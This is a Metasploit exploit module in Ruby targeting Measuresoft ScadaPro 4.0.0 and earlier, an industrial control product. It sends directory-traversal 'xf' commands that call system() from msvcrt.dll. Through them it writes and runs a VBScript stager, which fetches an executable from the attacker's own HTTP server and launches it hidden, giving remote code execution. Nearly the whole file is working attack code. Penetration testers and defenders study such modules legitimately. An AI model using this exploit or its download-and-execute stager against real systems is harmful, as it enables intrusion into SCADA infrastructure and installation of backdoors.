# $Id: scadapro_cmdexe.rb 13737 2011-09-16 08:23:59Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::EXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Measuresoft ScadaPro <= 4.0.0 Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote attackers to execute arbitray commands on
                the affected system by abusing via Directory Traversal attack when using the &#039;xf&#039;
                command (execute function). An attacker can execute system() from msvcrt.dll to
                upload a backdoor and gain remote code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;,                           # Initial discovery/poc
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;,  # msf
                    &#039;TecR0c <tecr0c[at]tecninja.net>&#039;,          # msf
                ],
            &#039;Version&#039;        => &#039;$Revision: 13737 $&#039;,
            &#039;References&#039;     =>
                [
                    #[ &#039;CVE&#039;, &#039;?&#039;],
                    #[ &#039;OSVDB&#039;, &#039;?&#039;],
                    [ &#039;BID&#039;, &#039;49613&#039;],
                    [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/scadapro_1-adv.txt&#039;],
                    [ &#039;URL&#039;, &#039;http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf&#039;],
                    [ &#039;URL&#039;, &#039;http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # truly universal
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Sep 16 2011&#039;))
 
            register_options(
            [
                Opt::RPORT(11234),
                OptString.new(&#039;URIPATH&#039;, [ true, "The URI to use.", "/" ]),
            ], self.class)
    end
 
    # couldn&#039;t generate a vbs or exe payload and then use the wF command
    # as there is a limit to the amount of data to write to disk.
    # so we just write out a vbs script like the old days.
 
    def build_vbs(url, stager_name)
        name_xmlhttp = rand_text_alpha(2)
        name_adodb   = rand_text_alpha(2)
 
        tmp = "#{@temp_folder}/#{stager_name}"
 
        vbs  = "echo Set #{name_xmlhttp} = CreateObject(\"Microsoft.XMLHTTP\") "
        vbs << ": #{name_xmlhttp}.open \"GET\",\"http://#{url}\",False : #{name_xmlhttp}.send"
        vbs << ": Set #{name_adodb} = CreateObject(\"ADODB.Stream\") "
        vbs << ": #{name_adodb}.Open : #{name_adodb}.Type=1 "
        vbs << ": #{name_adodb}.Write #{name_xmlhttp}.responseBody "
        vbs << ": #{name_adodb}.SaveToFile \"#{@temp_folder}/#{@payload_name}.exe\",2 "
        vbs << ": CreateObject(\"WScript.Shell\").Run \"#{@temp_folder}/#{@payload_name}.exe\",0 >> #{tmp}"
 
        return vbs
    end
 
    def on_request_uri(cli, request)
        if request.uri =~ /\.exe/
            print_status("Sending 2nd stage payload to #{cli.peerhost}:#{cli.peerport}...")
            return if ((p=regenerate_payload(cli)) == nil)
            data = generate_payload_exe( {:code=>p.encoded} )
            send_response(cli, data, {&#039;Content-Type&#039; => &#039;application/octet-stream&#039;} )
            return
        end
    end
 
    def exploit
        # In order to save binary data to the file system the payload is written to a .vbs
        # file and execute it from there.
        @payload_name = rand_text_alpha(4)
        @temp_folder  = "C:/Windows/Temp"
 
        if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
            lhost = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
        else
            lhost = datastore[&#039;SRVHOST&#039;]
        end
 
        payload_src  = lhost
        payload_src << ":" << datastore[&#039;SRVPORT&#039;] << datastore[&#039;URIPATH&#039;] << @payload_name << ".exe"
 
        stager_name = rand_text_alpha(6) + ".vbs"
        stager      = build_vbs(payload_src, stager_name)
 
        path = "..\\..\\..\\..\\..\\windows\\system32"
 
        createvbs = "xf%#{path}\\msvcrt.dll,system,cmd /c #{stager}\r\n"
        download_execute = "xf%#{path}\\msvcrt.dll,system,start #{@temp_folder}/#{stager_name}\r\n"
 
        print_status("Sending 1st stage payload...")
 
        connect
        sock.get_once()
        sock.put(createvbs)
        sock.get_once()
        sock.put(download_execute)
        handler()
        disconnect
 
        super
    end
 
end



